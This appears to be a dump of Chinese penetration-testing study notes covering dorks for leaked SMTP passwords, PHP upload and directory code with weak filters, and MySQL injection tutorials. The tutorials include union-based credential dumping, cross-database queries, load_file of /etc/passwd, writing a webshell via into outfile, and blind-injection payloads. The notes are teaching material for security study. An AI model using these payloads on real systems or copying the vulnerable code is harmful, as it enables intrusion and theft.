pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字 created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字 user:test #用户名搜素license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字 language:java test #在java语言的代码中搜索关键字user:test in:name test #组合搜索,用户名test的标题含有test的\n\n\n关键字配合谷歌搜索：site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp\n\n2、语法固定长期后续监控新泄露\n基于关键字监控基于项目规则监控\n\n项目地址\nhttps://github.com/madneal/gshark\nhttps://github.com/NHPT/FireEyeGoldCrystal\n➢网盘资源搜索-全局文件机密主要就是查看网盘中是否存有目标的敏感文件如：企业招标，人员信息，业务产品，应用源码等\n➢敏感目录文件-目录扫描&amp;爬虫后续会详细讲到各类工具项目\n➢网络空间进阶-证书&amp;图标&amp;邮箱证书资产fofa quake hunter：语句&#x3D;&#x3D;cert=&quot;&quot;&#x3D;&#x3D;\nICO资产（网址图标）\n打开目标官网；\nctrl+U查看网址源码\nctrl+F 全局是搜索ico\n发现ico网址点击进入并下载至本机\n打开fofa使用ico查找，拖入下载好的ico’文件，等待查询成功即可\n\n邮箱资产https://hunter.io/\n➢实战案例四则-技术分享打击方位**","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"024-安全开发-PHP开发PDF&课堂源码打包等","url":"/2025/09/16/024-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-PHP%E5%BC%80%E5%8F%91PDF&%E8%AF%BE%E5%A0%82%E6%BA%90%E7%A0%81%E6%89%93%E5%8C%85%E7%AD%89/","content":"024-安全开发-PHP开发PDF&amp;课堂源码打包等\n#知识点：\n1、PHP文件管理-显示&amp;上传功能实现2、文件上传-$_FILES&amp;过滤机制实现3、文件显示-目录遍历&amp;过滤机制实现\n\n文件管理模块-上传-过滤机制1、上传功能的实现\n使用gpt生成一个美观的upload.html上传页面\n\nphpupload.html代码&lt;body&gt;    &lt;div class=&quot;upload-box&quot;&gt;        &lt;h2&gt;文件上传示例&lt;/h2&gt;        &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;p&gt;选择要上传的文件：&lt;/p&gt;            &lt;input type=&quot;file&quot; name=&quot;uploaded_file&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; class=&quot;btn&quot; value=&quot;上传文件&quot; name=&quot;submit&quot;&gt;        &lt;/form&gt;    &lt;/div&gt;&lt;/body&gt;\n\n\n简单的upload.php\n\n// 从上传文件数组中获取文件名$name = $_FILES[&#x27;uploaded_file&#x27;][&#x27;name&#x27;];// 从上传文件数组中获取文件类型$type = $_FILES[&#x27;uploaded_file&#x27;][&#x27;type&#x27;];// 从上传文件数组中获取文件大小$size = $_FILES[&#x27;uploaded_file&#x27;][&#x27;size&#x27;];// 从上传文件数组中获取临时文件名$tmp_name = $_FILES[&#x27;uploaded_file&#x27;][&#x27;tmp_name&#x27;];// 从上传文件数组中获取错误码$error = $_FILES[&#x27;uploaded_file&#x27;][&#x27;error&#x27;];// 输出文件名echo $name . &quot;&lt;br&gt;&quot;;// 输出文件类型echo $type . &quot;&lt;br&gt;&quot;;// 输出文件大小echo $size . &quot;&lt;br&gt;&quot;;// 输出临时文件名echo $tmp_name . &quot;&lt;br&gt;&quot;;// 输出错误码echo $error . &quot;&lt;br&gt;&quot;;**// 如果成功将临时文件移动到指定目录，则输出文件上传成功if (move_uploaded_file($tmp_name, &#x27;upload/&#x27; . $name)) &#123;    echo &quot;文件上传成功!&quot;;&#125;**?&gt;\n\n\n\n\n\n\n\n\n\n2、黑名单过滤机制\n\n使用 explode 函数通过点号分割文件名，获取文件后缀\n使用 end 函数获取数组中的最后一个元素，即文件后缀\n检查文件后缀是否在黑名单中\n如果文件后缀在黑名单中，输出非法后缀文件信息\n如果文件后缀不在黑名单中，移动上传的文件到指定目录\n输出上传成功的提示信息\n\n\n\n\n// 上传文件后缀过滤，使用黑名单机制$black_ext = array(&#x27;php&#x27;, &#x27;asp&#x27;, &#x27;jsp&#x27;, &#x27;aspx&#x27;);// 使用 explode 函数通过点号分割文件名，获取文件后缀$fenge = explode(&#x27;.&#x27;, $name);// 使用 end 函数获取数组中的最后一个元素，即文件后缀$exts = end($fenge);// 检查文件后缀是否在黑名单中if (in_array($exts, $black_ext)) &#123;    // 如果文件后缀在黑名单中，输出非法后缀文件信息    echo &#x27;非法后缀文件&#x27; . $exts;&#125; else &#123;    // 如果文件后缀不在黑名单中，移动上传的文件到指定目录    move_uploaded_file($tmp_name, &#x27;upload/&#x27; . $name);    // 输出上传成功的提示信息    echo &quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;;&#125;\n\n\n如果过滤机制的后缀名没有考虑其他限制如.php5之类的，还是可以进行绕过黑名单**，**正常进行上传和下载\n3、白名单过滤机制\n只能上传白名单相符的后缀\n\n//白名单过滤机制**// 允许上传的文件后缀白名单$allow_ext = array(&#x27;png&#x27;, &#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;jpeg&#x27;);**// 使用 explode 函数通过点号分割文件名，获取文件后缀$fenge = explode(&#x27;.&#x27;, $name);// 使用 end 函数获取数组中的最后一个元素，即文件后缀$exts = end($fenge);// 检查文件后缀是否在允许的白名单中**if (!in_array($exts, $allow_ext)) &#123;    // 如果文件后缀不在白名单中，输出非法后缀文件信息    echo &#x27;非法后缀文件&#x27; . $exts;**&#125; else &#123;    // 如果文件后缀在白名单中，移动上传的文件到指定目录    move_uploaded_file($tmp_name, &#x27;upload/&#x27; . $name);    // 输出上传成功的提示信息    echo &quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;;&#125;\n\n\n4、文件类型过滤机制//MIME文件类型过滤**// 允许上传的文件 MIME 类型白名单$allow_type = array(&#x27;image/png&#x27;, &#x27;image/jpg&#x27;, &#x27;image/jpeg&#x27;, &#x27;image/gif&#x27;);**// 检查文件 MIME 类型是否在允许的白名单中if (!in_array($type, $allow_type)) &#123;    // 如果文件 MIME 类型不在白名单中，输出非法文件类型信息    echo &#x27;非法文件类型&#x27;;&#125; else &#123;    // 如果文件 MIME 类型在白名单中，移动上传的文件到指定目录    move_uploaded_file($tmp_name, &#x27;upload/&#x27; . $name);    // 输出上传成功的提示信息    echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;&#125;\n\n\n如果是图片在抓包内容Content-Type: image&#x2F;png\n\n如果是exe文件抓包内容Content-Type: application&#x2F;x-msdownload\n\n\n文件管理模块-显示-过滤机制功能：显示 上传 下载 删除 编辑 包含等1.打开目录读取文件列表2.递归循环读取文件列表3.判断是文件还是文件夹4.PHP.INI目录访问控制\n\nopendir() readdir() 区别is_dir() 函数用于检查指定的路径是否是一个目录（文件夹）opendir() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录readdir() 函数用于从打开的目录句柄中读取目录中的文件和子目录open_basedir：PHP.INI中的设置用来控制脚本程序访问目录\n\n&lt;?php// 获取要显示的目录，默认为当前目录$dir = $_GET[&#x27;path&#x27;] ?? &#x27;./&#x27;;// 打开目录，读取文件列表 opendirfunction filelist($dir)&#123;    // 判断目录是否存在    if ($dh = opendir($dir)) &#123;        // 循环读取文件列表 while readdir        **while (($file = readdir($dh)) !== false) &#123;            // 判断是文件还是文件夹 is_dir            if (is_dir($dir . &#x27;/&#x27; . $file)) &#123;                // 如果是文件夹，显示文件夹图标和链接                echo &quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=$dir/$file&#x27;&gt;&quot; . $file . &#x27;&lt;/a&gt;&lt;/li&gt;&#x27;;            &#125; else &#123;                // 如果是文件，显示文件图标和链接                echo &#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27; . $file . &#x27;&lt;/a&gt;&lt;/li&gt;&#x27;;            &#125;        &#125;        // 关闭目录句柄        closedir($dh);    &#125;**&#125;// 调用函数显示目录文件列表filelist($dir);?&gt;\n\n\nwhile循环迭代目录中的每个条目。**readdir($dh)**读取目录中的下一个条目。循环继续，直到没有更多的条目（readdir返回false）。在循环内部，is_dir($dir . ‘&#x2F;‘ . $file)检查当前目录项是否是一个目录，通过构建完整路径并使用is_dir函数来判断。条件通过使用斜杠（&#x2F;）将目录路径（$dir）与当前目录项（$file）连接起来，形成完整的路径。\n\nPHP.INI目录访问控制\n开启权限控制之前 使用**../**或者**c:/等依旧可以访问到目标服务器的所有文件目录\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"026-安全开发-smarty模版引用&源代码等","url":"/2025/09/16/026-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-smarty%E6%A8%A1%E7%89%88%E5%BC%95%E7%94%A8&%E6%BA%90%E4%BB%A3%E7%A0%81%E7%AD%89/","content":"026-安全开发-smarty模版引用&amp;源代码等\n#知识点：\n1、PHP新闻显示-数据库操作读取显示2、PHP模版引用-自写模版&amp;Smarty渲染3、PHP模版安全-RCE代码执行&amp;三方漏洞\n\n演示案例：一.新闻列表&amp;模版引用-代码RCE安全\n1、数据库创建新闻存储2、代码连接数据库读取3、页面进行自定义显示\n\n简单实现新闻列表显示\n\n\n&lt;?phpinclude &quot;config.php&quot;;$id =$_GET[&#x27;id&#x27;] ?? &#x27;1&#x27;;$sql = &quot;select * from news where id=$id &quot;;$data = mysqli_query($conn,$sql);while($row=mysqli_fetch_row($data))&#123;    echo &quot;&lt;tile&gt;&quot;.$row[&#x27;1&#x27;].&quot;&lt;/title&gt;&lt;br&gt;&quot;;    echo $row[&#x27;2&#x27;].&quot;&lt;br&gt;&quot;;    echo $row[&#x27;3&#x27;].&quot;&lt;br&gt;&quot;;    echo &quot;&lt;img src = &#x27;./img/xiaodi.jpg&#x27; width=&#x27;500&#x27; height=&#x27;500&#x27; &gt;&lt;/img&gt;&lt;br&gt;&quot;;   &#125;?&gt;\n\n二.#自写模版引用1、页面显示样式编排2、显示数据插入页面3、引用模版调用触发","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"042-WEB攻防-PHP应用&MYSQL架构&SQL注入&跨库查询&文件读写&权限操作","url":"/2025/09/16/042-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&MYSQL%E6%9E%B6%E6%9E%84&SQL%E6%B3%A8%E5%85%A5&%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2&%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99&%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C/","content":"042-WEB 攻防：PHP 应用 &amp; MYSQL 架构 &amp; SQL 注入 &amp; 跨库查询 &amp; 文件读写 &amp; 权限操作二、核心知识点与演示案例1. 核心知识点\nPHP-MYSQL-SQL 注入 - 常规查询\n\nPHP-MYSQL-SQL 注入 - 跨库查询\n\nPHP-MYSQL-SQL 注入 - 文件读写\n\n\n2. 演示案例\nPHP-MYSQL-Web 组成架构解析\n\nPHP-MYSQL-SQL 常规查询实战\n\nPHP-MYSQL-SQL 跨库查询实战\n\nPHP-MYSQL-SQL 文件读写实战\n\n\n三、PHP-MYSQL-Web 组成架构1. 架构核心逻辑服务器部署 MySQL 数据库，集中管理多个 Web 站点的数据库；站点与数据库的关联通过 “数据库用户” 实现，核心差异在于 “用户权限分配策略”，两种主流方案如下：\n2. 两种数据库管理方案对比\n\n\n管理方案\n实现逻辑\n优缺点分析\n\n\n\n1. 统一 root 用户管理\n所有站点（如www.zblog.com、www.demo01.com）均使用 MySQL 的 root 用户连接数据库\n优点：配置简单，无需创建多个用户；缺点：权限过度集中，一个站点被注入则所有站点数据库暴露\n\n\n2. 一对一用户管理（推荐）\n为每个站点创建独立数据库用户（如 zblog 站点用 zblog 用户、demo01 站点用 demo01 用户），仅授予对应数据库的操作权限\n优点：权限最小化，单个站点漏洞不影响其他站点；缺点：配置稍复杂，需逐个管理用户权限\n\n\n3. 架构安全建议\n生产环境强制使用 “一对一用户管理”，避免 root 用户直接关联 Web 应用；\n\n数据库用户仅授予 “SELECT&#x2F;INSERT&#x2F;UPDATE&#x2F;DELETE” 等必要权限，禁用 “FILE”“SUPER” 等高危权限（防止文件读写注入）。\n\n\n四、PHP-MYSQL-SQL 常规查询（注入核心流程）1. SQL 注入的核心概念\n原理：Web 应用接收用户输入的参数后，未过滤特殊字符（如 ‘、and、or、union 等） ，直接将参数代入 MySQL 查询语句执行，导致攻击者可构造恶意 SQL 语句控制查询结果。\n\n本质：“利用 SQL 语句的灵活性，将用户输入从‘数据’伪装成‘指令’”——MySQL 支持的操作（查、改、删、读写文件），注入均可尝试实现。\n\n关键前提：参数未过滤、查询结果可回显（或存在盲注条件）、数据库用户有对应操作权限。\n\n\n2. 核心辅助表：information_schema（MySQL 5.0 + 必备）information_schema是 MySQL 自带的 “元数据库”，存储所有数据库、表、列的结构信息，是注入中 “猜解数据结构” 的核心工具，关键表与列如下：\n\n\n\n表名\n核心列名\n作用描述\n\n\n\ninformation_schema.schemata\nschema_name\n存储所有数据库的名称，用于跨库查询或全局猜解数据库\n\n\ninformation_schema.tables\ntable_schema\n关联 “数据库名”，用于筛选指定数据库下的表\n\n\ninformation_schema.tables\ntable_name\n存储表名，用于猜解目标数据库中的表结构\n\n\ninformation_schema.columns\ntable_name\n关联 “表名”，用于筛选指定表下的列\n\n\ninformation_schema.columns\ncolumn_name\n存储列名，用于猜解目标表中的字段（如 username、password）\n\n\n3. 常规注入完整流程（以 “获取 admin 表账号密码” 为例）步骤 1：判断注入点与列数（order by）\n目的：确定当前查询的表包含多少列（后续 union 查询需保持列数一致）。\n\nSQL 示例：http://192.168.137.1:84/new.php?id=1 order by 6\n\n逻辑：\n\n\n若页面正常显示，说明表至少有 6 列；\n\n\n\n若页面报错（如 “Unknown column ‘7’ in ‘order clause’”），说明表仅有 6 列（输入 7 时超出）。\n\n\n注意：从较小数字（如 1、2）逐步递增，避免直接输入大数字浪费时间。\n\n\n步骤 2：确认回显位置（union select）\n目的：找到查询结果中 “可在页面显示” 的列（后续将敏感信息代入这些列）。\n\nSQL 示例：http://192.168.137.1:84/new.php?id=-1 union select 1,2,3,4,5,6\n\n逻辑：\n\n\n用id&#x3D;-1让原查询无结果，仅显示 union 查询的内容；\n\n\n\n若页面显示 “2、4、5”，说明第 2、4、5 列是回显列（后续将数据库信息代入这些列）。\n\n\n\n步骤 3：获取基础信息（数据库名、用户、版本）\n目的：判断是否具备进一步注入的条件（如 MySQL 版本是否 5.0+、是否为 root 用户）。\n\nSQL 示例：\n\n\n查数据库名与用户：id&#x3D;-1 union select 1,2,3,database(),user(),6（回显第 4 列显示数据库名，第 5 列显示当前用户）；\n\n\n\n查版本与操作系统：id&#x3D;-1 union select 1,2,3,version(),@@version_compile_os,6（第 4 列显示版本，第 5 列显示系统，如 Windows NT、Linux）。\n\n\n关键判断：\n\n\n若version()返回 5.0 以上，说明支持 information_schema 表；\n\n\n\n若user()返回root@localhost，说明具备高权限（可尝试跨库、文件读写）。\n\n\n\n步骤 4：猜解目标数据库下的表名\n目的：找到存储敏感信息的表（如 admin、user、member）。\n\nSQL 示例：id&#x3D;-1 union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema&#x3D;’demo01’\n\n参数说明：\n\n\ngroup_concat()：将多个表名拼接为一个字符串（避免分页显示）；\n\n\n\ntable_schema&#x3D;’demo01’：指定目标数据库（步骤 3 中database()获取的结果）。\n\n\n预期结果：回显列显示admin,user,article（假设 demo01 数据库包含这 3 个表）。\n\n\n步骤 5：猜解目标表下的列名\n目的：找到表中存储敏感数据的字段（如 username、password）。\n\nSQL 示例：id&#x3D;-1 union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name&#x3D;’admin’ and table_schema&#x3D;’demo01’\n\n注意：若表名被单引号过滤，可使用 Hex 编码（如table_name&#x3D;0x61646D696E，0x 后为 “admin” 的十六进制）。\n\n预期结果：回显列显示id,username,password,email。\n\n\n步骤 6：获取敏感数据（账号密码）\n目的：读取 admin 表中的实际数据。\n\nSQL 示例：id&#x3D;-1 union select 1,2,3,username,password,6 from admin limit 0,1\n\n参数说明：\n\n\nlimit 0,1：读取第 1 行数据（0 表示起始索引，1 表示读取数量）；\n\n\n\n若需读取多行，修改为limit 1,1（第 2 行）、limit 2,1（第 3 行）等。\n\n\n后续处理：若 password 是 MD5 加密，需用 MD5 解密工具（如 CMD5、PMD5）破解。\n\n\n五、PHP-MYSQL-SQL 跨库查询（高权限注入）1. 跨库查询的核心逻辑\n定义：通过 A 网站的 SQL 注入点，查询 MySQL 服务器中 B 网站的数据库数据（如通过 demo01 站点注入获取 zblog 站点的账号密码）。\n\n本质：利用 MySQL 的 “跨库访问语法”（数据库名.表名），结合 root 用户对所有数据库的访问权限实现。\n\n\n2. 跨库查询的必要条件\n数据库用户为 root：只有 root 用户拥有 “访问所有数据库” 的权限，普通用户仅能访问自身关联的数据库；\n\n已知目标数据库名：需通过information_schema.schemata获取所有数据库名（确定要查询的 B 网站数据库）；\n\n注入点支持 union 查询：需通过 union 语句构造跨库查询逻辑。\n\n\n3. 跨库查询完整流程（以 “demo01 注入→查 zblog 数据库” 为例）步骤 1：获取所有数据库名（确定目标库）\nSQL 示例：id&#x3D;-1 union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata\n\n预期结果：回显列显示information_schema,demo01,zblog,mysql（确定目标数据库为 zblog）。\n\n\n步骤 2：查询目标数据库下的表名\nSQL 示例：id&#x3D;-1 union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema&#x3D;’zblog’\n\n预期结果：回显列显示zbp_member,zbp_article,zbp_comment（目标表为 zbp_member，存储用户信息）。\n\n\n步骤 3：查询目标表下的列名\nSQL 示例：id&#x3D;-1 union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name&#x3D;’zbp_member’ and table_schema&#x3D;’zblog’\n\n预期结果：回显列显示mem_ID,mem_Name,mem_Password,mem_Email（敏感字段为 mem_Name、mem_Password）。\n\n\n步骤 4：读取目标表的敏感数据\nSQL 示例：id&#x3D;-1 union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member\n\n关键语法：zblog.zbp_member表示 “zblog 数据库下的 zbp_member 表”，必须显式指定 “数据库名。表名”，否则会报错（找不到表）。\n\n预期结果：回显列显示 zblog 站点的用户名（如 admin）和加密后的密码。\n\n\n4. 常见问题与解决方案\n\n\n问题现象\n原因分析\n解决方案\n\n\n\n报错 “Table ‘demo01.zbp_member’ doesn’t exist”\n未指定目标数据库，默认从当前数据库（demo01）查询\n在表名前添加目标数据库名：zblog.zbp_member\n\n\n单引号被过滤（如table_schema&#x3D;’zblog’报错）\n应用对单引号进行了转义或过滤\n使用 Hex 编码：table_schema&#x3D;0x7A626C6F67（0x 后为 “zblog” 的十六进制）\n\n\n无法查询其他数据库\n当前用户不是 root，仅有权限访问 demo01\n放弃跨库，专注于当前数据库（demo01）的敏感数据提取\n\n\n六、PHP-MYSQL-SQL 文件读写（高危操作）1. 文件读写的必要条件\nroot 用户权限：只有 root 用户可修改secure-file-priv配置，且具备文件读写权限；\n\nsecure-file-priv 配置允许：\n\n\n\n\nMySQL 默认禁用文件读写（secure-file-priv&#x3D;null），需在my.ini（Windows）或my.cnf（Linux）中配置路径；\n\n\n\n示例配置：secure-file-priv &#x3D; “G:&#x2F;develop&#x2F;safety&#x2F;phpstudy_pro&#x2F;WWW&#x2F;“（仅允许读写该目录下的文件）；\n\n\n\n配置后需重启 MySQL 服务生效。\n\n\n\n\n已知文件路径：需知道 Web 根目录或目标文件的绝对路径（否则无法定位文件）。\n\n2. 文件读写实战流程（1）读取文件（load_file () 函数）\n目的：读取服务器上的敏感文件（如配置文件、密码文件）。\n\nSQL 示例：\n\n\n读取 Windows 下的文件：id&#x3D;-1 union select 1,load_file(‘D:&#x2F;1.txt’),3,4,5,6；\n\n\n\n读取 Linux 下的文件：id&#x3D;-1 union select 1,load_file(‘&#x2F;etc&#x2F;passwd’),3,4,5,6（&#x2F;etc&#x2F;passwd 是 Linux 用户密码文件）。\n\n\n常见可读取文件：\n\n\nWeb 配置文件：G:&#x2F;develop&#x2F;safety&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01&#x2F;config.php（存储数据库连接信息）；\n\n\n\n中间件配置：C:&#x2F;xampp&#x2F;apache&#x2F;conf&#x2F;httpd.conf（Apache 根目录配置）；\n\n\n\n系统文件：Windows 的C:&#x2F;Windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts、Linux 的&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log（日志文件）。\n\n\n\n（2）写入文件（into outfile）\n目的：向服务器写入恶意文件（如一句话木马），获取 Webshell 权限。\n\nSQL 示例 1：写入普通文件：id&#x3D;-1 union select 1,’test content’,3,4,5,6 into outfile ‘G:&#x2F;develop&#x2F;safety&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01&#x2F;test.txt’\n\nSQL 示例 2：写入一句话木马：id&#x3D;-1 union select 1,’‘,3,4,5,6 into outfile ‘G:&#x2F;develop&#x2F;safety&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01&#x2F;xiaodi.php’\n\n木马作用：通过 POST 请求向xiaodi.php传递x参数（如x&#x3D;phpinfo();），即可执行任意 PHP 代码（如查看服务器信息、上传文件）。\n\n注意：\n\n\n路径必须是 Web 根目录下（否则无法通过 HTTP 访问木马文件）；\n\n\n\nWindows 路径需用\\转义（如G:\\develop\\…）或&#x2F;（MySQL 支持两种路径分隔符）。\n\n\n\n3. 如何获取文件路径（关键难题）\n\n\n路径获取方式\n实现方法\n\n\n\n1. 报错信息泄露\n故意构造错误 SQL（如id&#x3D;1’），若页面显示 “File ‘G:&#x2F;…&#x2F;new.php’ not found”，直接获取路径\n\n\n2. phpinfo 页面\n若应用有 phpinfo 页面（如http://xxx.com/phpinfo.php），查看 “DOCUMENT_ROOT” 字段（Web 根目录）\n\n\n3. 常见默认路径\n利用中间件默认路径：- XAMPP（Windows）：C:&#x2F;xampp&#x2F;htdocs&#x2F;；- WAMP：C:&#x2F;wamp&#x2F;www&#x2F;；- Linux Apache：&#x2F;var&#x2F;www&#x2F;html&#x2F;\n\n\n4. 日志文件推断\n读取 Apache&#x2F;Nginx 日志文件（如&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log），从请求记录中获取路径\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"044-WEB攻防-PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式","url":"/2025/09/16/044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&SQL%E7%9B%B2%E6%B3%A8&%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE&%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD&%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86&%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F/","content":"044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式1.演示案例：\n➢PHP-MYSQL-SQL操作-增删改查➢PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟➢PHP-MYSQL-注入条件-数据回显&amp;错误处理➢PHP-MYSQL-CMS案例-插入报错&amp;删除延迟\n\n2. 核心知识点概览本文围绕 PHP 与 MySQL 交互中的 SQL 注入风险展开，核心覆盖 3 类关键内容：\n\nPHP-MySQL 的 SQL 基础操作（增删改查）及注入风险点\n\n3 种 SQL 盲注技术（布尔型、时间型、报错型）的原理与实战\n\n注入条件判断（数据回显、错误处理）及 CMS 实战案例（插入报错、删除延时）\n\n\n3. PHP-MySQL-SQL 基础操作（增删改查）3.1 操作定义与场景SQL 注入的风险根源是 “用户输入未过滤直接拼接 SQL 语句”，需先理解 PHP 中常见的 MySQL 操作逻辑：\n\n\n\n操作类型\n功能描述\n应用场景\n基础 SQL 语句\n注入风险点\n\n\n\n查询（Select）\n从数据库读取数据\n文章详情、用户登录验证\nSELECT * FROM news WHERE id&#x3D;$id\n$id 未过滤，可拼接逻辑判断\n\n\n新增（Insert）\n向数据库插入数据\n留言提交、用户注册\nINSERT INTO news (title) VALUES (‘$title’)\n$title 含单引号 &#x2F; 特殊字符，破坏 SQL 结构\n\n\n删除（Delete）\n从数据库删除数据\n删除文章、删除用户\nDELETE FROM news WHERE id&#x3D;$id\n$id 拼接or 1&#x3D;1可删除所有数据\n\n\n修改（Update）\n更新数据库中已有数据\n修改密码、编辑文章\nUPDATE user SET pwd&#x3D;’$new_pwd’ WHERE id&#x3D;$id\n(new_pwd或)id 未过滤，可篡改更新条件\n\n\n3.2 补充：PHP 代码示例（风险版 vs 安全版）风险版（存在注入）// 直接拼接用户输入，无过滤$id = $_GET[&#x27;id&#x27;]; // 用户输入：1&#x27; or 1=1 --$sql = &quot;SELECT * FROM news WHERE id=$id&quot;; $result = mysql_query($sql); // 执行后变成：SELECT * FROM news WHERE id=1&#x27; or 1=1 --\n\n安全版（参数化查询）// 使用MySQLi参数化查询，避免注入$id = $_GET[&#x27;id&#x27;];$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM news WHERE id=?&quot;); $stmt-&gt;bind_param(&quot;i&quot;, $id); // 绑定参数（i=整数类型）$stmt-&gt;execute();\n\n4. 三种 SQL 盲注技术详解什么是盲注？当注入时无法直接从页面获取数据库数据回显（如页面只显示 “成功 &#x2F; 失败”“加载中”，无具体内容），需通过 “逻辑判断” 或 “错误触发” 间接获取数据的注入方式，称为盲注。\n4.1 基于布尔的 SQL 盲注（需页面回显变化）原理利用 SQL 的逻辑判断（and&#x2F;or），构造条件语句，通过页面是否正常显示（如 “存在数据” vs “空白页”）判断条件是否成立，逐步猜解数据。\n核心函数（含详细解释 + 示例）\n\n\n函数\n作用\n示例（猜解数据库名）\n说明\n\n\n\nlength()\n计算字符串长度\nand length(database())&#x3D;7\n判断当前数据库名是否为 7 个字符\n\n\nleft()\n从左截取指定长度字符\nand left(database(),1)&#x3D;’p’\n判断数据库名第 1 个字符是否为 ‘p’\n\n\nsubstr()\n从指定位置截取指定长度字符（substr (字符串，起始位，长度)）\nand substr(database(),2,1)&#x3D;’i’\n判断数据库名第 2 个字符是否为 ‘i’\n\n\nord()\n将字符转为 ASCII 码值\nand ord(left(database(),1))&#x3D;112\n‘p’ 的 ASCII 码是 112，判断第 1 个字符是否为 ‘p’\n\n\nregexp\n正则匹配\nand database() regexp ‘^p’\n判断数据库名是否以 ‘p’ 开头\n\n\nlike\n模糊匹配（% 匹配任意字符，_匹配单个字符）\nand database() like ‘p%’\n判断数据库名是否以 ‘p’ 开头\n\n\n注入步骤（实战示例）\n判断注入点：访问http://xxx/news.php?id=1 and 1&#x3D;1（页面正常），id&#x3D;1 and 1&#x3D;2（页面空白）→ 存在布尔盲注点。\n\n猜解数据库名长度：尝试id&#x3D;1 and length(database())&#x3D;6（页面正常）→ 数据库名长度为 6。\n\n逐字符猜解数据库名：\n\n\n\n\nid&#x3D;1 and ord(left(database(),1))&gt;110（正常，说明第 1 个字符 ASCII&gt;110）\n\n\n\nid&#x3D;1 and ord(left(database(),1))&lt;113（正常，说明 &lt; 113）\n\n\n\nid&#x3D;1 and ord(left(database(),1))&#x3D;112（正常，ASCII&#x3D;112→’p’）\n\n\n\n\n后续猜解表名、列名、数据：重复上述逻辑，如and ord(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;117（猜解第一个表名第 1 个字符是否为 ‘u’）。\n\n适用场景页面有明确的 “正常 &#x2F; 异常” 回显（如正确 ID 显示内容，错误 ID 显示空白），无错误提示。\n4.2 基于时间的 SQL 盲注（无需回显 &#x2F; 报错）原理利用SLEEP()函数构造条件，若条件成立则触发延迟（如 3 秒），通过页面响应时间判断条件是否成立，适合无任何回显的场景。\n核心函数\n\n\n函数\n作用\n示例\n说明\n\n\n\nIF(条件, 成立执行, 不成立执行)\n条件判断函数\nIF(1&#x3D;1, SLEEP(3), 0)\n1&#x3D;1 成立，执行延迟 3 秒\n\n\nSLEEP(N)\n使 SQL 执行暂停 N 秒\nSLEEP(5)\n暂停 5 秒，用于观察延迟\n\n\n注入语句（带说明）\n验证注入点：id&#x3D;1 and sleep(3) → 页面延迟 3 秒加载→存在时间盲注点。\n\n猜解数据库名长度：id&#x3D;1 and if(length(database())&#x3D;6, sleep(3), 0) → 若延迟 3 秒→长度为 6。\n\n逐字符猜解：id&#x3D;1 and if(ord(left(database(),1))&#x3D;112, sleep(3), 0) → 若延迟→第 1 个字符为 ‘p’。\n\n\n注意事项\n网络波动可能影响延迟判断，建议多次测试。\n\n部分数据库（如 PostgreSQL）用pg_sleep(N)替代SLEEP(N)。\n\n\n适用场景页面无任何回显（无论输入正确与否，页面显示一致），且无错误提示。\n4.3 基于报错的 SQL 盲注（需开启错误显示）原理利用 MySQL 函数（如updatexml()、extractvalue()）的语法特性，构造非法参数触发报错，使错误信息中携带数据库数据（如版本、表名）。\n核心函数（报错原理 + 示例）\n\n\n函数\n报错原理\n注入语句（获取数据库版本）\n报错信息（含数据）\n\n\n\nupdatexml(目标XML, XPath路径, 替换值)\nXPath 路径需符合 XML 语法，若含特殊字符（如～）则报错\nand updatexml(1, concat(0x7e, (select version()), 0x7e), 1)\nXPATH syntax error: 